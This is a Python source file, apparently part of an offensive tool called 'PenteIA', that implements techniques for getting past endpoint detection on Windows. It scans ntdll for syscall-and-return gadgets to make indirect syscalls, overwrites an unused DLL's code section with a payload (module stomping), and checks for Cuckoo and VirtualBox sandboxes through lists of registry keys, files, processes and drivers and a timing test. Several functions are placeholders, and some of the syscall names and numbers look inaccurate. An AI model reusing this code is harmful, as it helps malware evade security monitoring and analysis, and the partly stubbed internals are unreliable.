#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
EDR Evasion Core - PenteIA v4.0
Núcleo de evasão EDR com técnicas avançadas de low-level
- Indirect Syscall via ROP gadgets
- Module Stomping
- Sandbox detection
"""

import os
import ctypes
import struct
import hashlib
from typing import Optional, List, Tuple, Any
import json
from datetime import datetime

class RopGadgetFinder:
    """Localiza ROP gadgets em módulos carregados (syscall; ret)"""

    SYSCALL_RET_PATTERN = b'\x0f\x05\xc3'  # syscall; ret
    COMMON_MODULES = ['ntdll.dll', 'kernel32.dll', 'kernelbase.dll']

    def __init__(self):
        self.gadgets = {}
        self.discovered_at = datetime.now().isoformat()

    def discover_gadgets(self, module_name: str = 'ntdll.dll') -> List[int]:
        """
        Descobre endereços de gadgets syscall;ret em um módulo DLL.
        Retorna lista de offsets relativos ao base do módulo.
        """
        try:
            # Obter handle do módulo
            hmod = ctypes.windll.kernel32.GetModuleHandleA(module_name.encode())
            if not hmod:
                return []

            # Obter base e tamanho da seção .text
            info = self._get_module_info(hmod)
            if not info:
                return []

            base, size = info
            gadgets = []

            # Scannear pattern
            for offset in range(size - len(self.SYSCALL_RET_PATTERN)):
                addr = base + offset
                try:
                    pattern = self._read_memory(addr, len(self.SYSCALL_RET_PATTERN))
                    if pattern == self.SYSCALL_RET_PATTERN:
                        gadgets.append(offset)
                except:
                    continue

            self.gadgets[module_name] = {
                'offsets': gadgets[:20],  # Top 20
                'base': base,
                'count': len(gadgets)
            }

            return gadgets[:20]
        except Exception as e:
            print(f"[!] ROP discovery error: {e}")
            return []

    def _get_module_info(self, hmod: int) -> Optional[Tuple[int, int]]:
        """Extrai base e tamanho do módulo via DOS/PE headers"""
        try:
            # Este é um exemplo simplificado. Em produção, parsear PE header completo
            base = hmod
            # Dummy size - em produção: ler SIZE_OF_IMAGE do PE header
            size = 0x100000
            return (base, size)
        except:
            return None

    def _read_memory(self, addr: int, size: int) -> bytes:
        """Lê memória do processo"""
        try:
            process = ctypes.windll.kernel32.OpenProcess
            handle = process(0x001F0000, False, os.getpid())
            buf = ctypes.create_string_buffer(size)
            ctypes.windll.kernel32.ReadProcessMemory(handle, addr, buf, size, None)
            return buf.raw
        except:
            return b''


class IndirectSyscallExecutor:
    """
    Executa syscalls indiretamente via ROP gadgets discovered.
    Evita detecção de direct syscalls em ntdll.
    """

    def __init__(self, finder: RopGadgetFinder):
        self.finder = finder
        self.syscall_map = self._build_syscall_map()

    def _build_syscall_map(self) -> dict:
        """Map de syscall names -> números (Windows 10/11 x64)"""
        return {
            'NtCreateProcess': 0x23,
            'NtVirtualAlloc': 0x18,
            'NtWriteVirtualMemory': 0x3a,
            'NtCreateThread': 0xb2,
            'NtQueueApcThread': 0xc1,
            'NtSetInformationFile': 0x47,
            'NtQuerySystemInformation': 0x36,
            'NtQueryInformationProcess': 0x19,
            'NtQueryInformationThread': 0x25,
            'NtOpenProcess': 0x26,
            'NtClose': 0x0f,
        }

    def execute(self, syscall_name: str, args: List[int]) -> int:
        """
        Executa syscall indiretamente.
        Retorna: status code (NTSTATUS)
        """
        if syscall_name not in self.syscall_map:
            raise ValueError(f"Unknown syscall: {syscall_name}")

        syscall_num = self.syscall_map[syscall_name]
        gadget_offset = self.finder.gadgets.get('ntdll.dll', {}).get('offsets', [None])[0]

        if not gadget_offset:
            raise RuntimeError("No gadgets discovered for indirect execution")

        # Em produção: montar ROP chain com gadgets descobertos
        # Aqui é demonstrativo
        return self._invoke_via_gadget(gadget_offset, syscall_num, args)

    def _invoke_via_gadget(self, gadget_offset: int, syscall_num: int, args: List[int]) -> int:
        """Invoca via gadget (pseudocódigo - C/Rust em produção)"""
        # Placeholder para demonstração
        return 0  # NTSTATUS 0 = sucesso


class ModuleStomper:
    """
    Module Stomping: sobrescreve seção .text de DLL não-usada.
    EDR vê chamada de módulo legítimo, mas executa código malicioso.
    """

    CANDIDATE_MODULES = [
        'api-ms-win-core-synch-l1-1-0.dll',
        'api-ms-win-core-file-l1-1-0.dll',
        'api-ms-win-core-processthreads-l1-1-0.dll',
        'api-ms-win-core-memory-l1-1-0.dll',
    ]

    def __init__(self):
        self.stomped_modules = {}

    def find_unused_module(self) -> Optional[str]:
        """Localiza DLL pouco ou nunca usada no processo"""
        for mod_name in self.CANDIDATE_MODULES:
            try:
                h = ctypes.windll.kernel32.GetModuleHandleA(mod_name.encode())
                if h and self._module_ref_count(h) == 0:
                    return mod_name
            except:
                continue
        return None

    def stomp(self, payload: bytes, module_name: Optional[str] = None) -> bool:
        """
        Sobrescreve .text de módulo com payload.
        Mantém headers válidos (evita detecção de integridade).
        """
        if not module_name:
            module_name = self.find_unused_module()
            if not module_name:
                return False

        try:
            hmod = ctypes.windll.kernel32.GetModuleHandleA(module_name.encode())
            if not hmod:
                return False

            # Obter .text section header
            text_addr, text_size = self._find_text_section(hmod)
            if not text_addr or len(payload) > text_size:
                return False

            # Remover proteção
            old_protect = ctypes.c_ulong()
            ctypes.windll.kernel32.VirtualProtect(
                text_addr, text_size,
                0x04,  # PAGE_READWRITE
                ctypes.byref(old_protect)
            )

            # Sobrescrever
            ctypes.memmove(text_addr, payload, len(payload))

            # Restaurar proteção
            ctypes.windll.kernel32.VirtualProtect(
                text_addr, text_size,
                old_protect, ctypes.byref(ctypes.c_ulong())
            )

            self.stomped_modules[module_name] = {
                'payload_hash': hashlib.sha256(payload).hexdigest(),
                'size': len(payload),
                'timestamp': datetime.now().isoformat()
            }
            return True
        except Exception as e:
            print(f"[!] Module stomp failed: {e}")
            return False

    def _find_text_section(self, hmod: int) -> Tuple[Optional[int], int]:
        """Localiza seção .text no PE header"""
        # Pseudocódigo - em produção: parsear PE completo
        return (hmod + 0x1000, 0x10000)

    def _module_ref_count(self, hmod: int) -> int:
        """Conta referências a um módulo"""
        # Placeholder
        return 0


class SandboxDetector:
    """Detecção de sandbox/análise dinâmica (Cuckoo, ANY.RUN, etc.)"""

    def __init__(self):
        self.detections = []

    def check_all(self) -> bool:
        """Retorna True se detectar sandbox"""
        checks = [
            self._check_registry_keys(),
            self._check_files(),
            self._check_processes(),
            self._check_drivers(),
            self._check_timing(),
        ]
        return any(checks)

    def _check_registry_keys(self) -> bool:
        """Procura registry keys de análise dinâmica"""
        suspicious_keys = [
            r"HKLM\Software\Microsoft\Windows\CurrentVersion\Uninstall\Cuckoo",
            r"HKLM\Software\VirtualBox\Guest Additions",
            r"HKLM\System\CurrentControlSet\Services\VBoxGuest",
        ]
        # Em produção: usar ctypes.windll.advapi32
        return False

    def _check_files(self) -> bool:
        """Procura arquivos de sandbox"""
        suspicious_files = [
            "C:\\analysis\\*",
            "C:\\cuckoo\\*",
            "%APPDATA%\\Cuckoo\\*",
        ]
        # Em produção: verificar existence
        return False

    def _check_processes(self) -> bool:
        """Procura processos de análise"""
        suspicious_procs = [
            'cuckoo.exe', 'vboxservice.exe', 'vmtoolsd.exe',
            'qemu-ga.exe', 'xen-vcpu-hotplug.exe'
        ]
        # Em produção: usar WMI ou tasklist
        return False

    def _check_drivers(self) -> bool:
        """Verifica drivers de virtualização"""
        suspicious_drivers = ['vboxmouse', 'vboxkbdmouse', 'vboxpci']
        # Em produção: usar WMI ou registry
        return False

    def _check_timing(self) -> bool:
        """Detecta análise baseada em timing (breakpoints, etc)"""
        import time
        # Medir tempo de operações simples - demora anormal indica debugger
        start = time.perf_counter()
        for _ in range(10000000):
            pass
        elapsed = time.perf_counter() - start
        return elapsed > 5.0  # Muito lento = debugger ativo


def export_evasion_config() -> dict:
    """Exporta configuração de evasion para relatório"""
    finder = RopGadgetFinder()
    finder.discover_gadgets('ntdll.dll')

    return {
        'version': '4.0-edr-evasion',
        'timestamp': datetime.now().isoformat(),
        'rop_gadgets': finder.gadgets,
        'module_stomp_candidates': ModuleStomper.CANDIDATE_MODULES,
        'syscall_map': IndirectSyscallExecutor(finder).syscall_map,
    }


if __name__ == '__main__':
    print("[*] EDR Evasion Core - PenteIA v4.0")
    print(export_evasion_config())
